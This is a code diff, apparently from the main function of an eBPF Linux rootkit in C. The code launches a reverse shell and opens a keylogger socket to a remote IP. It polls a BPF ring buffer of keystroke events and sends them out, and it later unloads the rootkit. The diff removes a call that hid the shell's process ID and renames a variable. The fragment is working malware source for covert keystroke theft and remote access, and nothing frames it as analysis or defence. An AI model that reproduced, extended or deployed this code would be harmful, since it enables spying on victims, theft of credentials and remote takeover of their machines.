@@ -26,21 +26,20 @@ int main()
 
 	if (reverse_shell_pid == 0) {
 		run_reverse_shell();
-    } else if (reverse_shell_pid > 0) {
-        hider_hide_pid(reverse_shell_pid);
     }
 
     struct keylogger_ctx ctx = {
         .keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT),
     };
 
-    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events), process_key_event, &ctx, NULL);
+    struct ring_buffer *keylog_event_rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events), process_key_event, &ctx, NULL);
+
     while (1) {
 
         if (ctx.keylogger_socket_fd < 0)
             ctx.keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT);
 
-        ring_buffer__poll(rb, 100);
+        ring_buffer__poll(keylog_event_rb, 100);
     }
 
     unload_rootkit(skel);
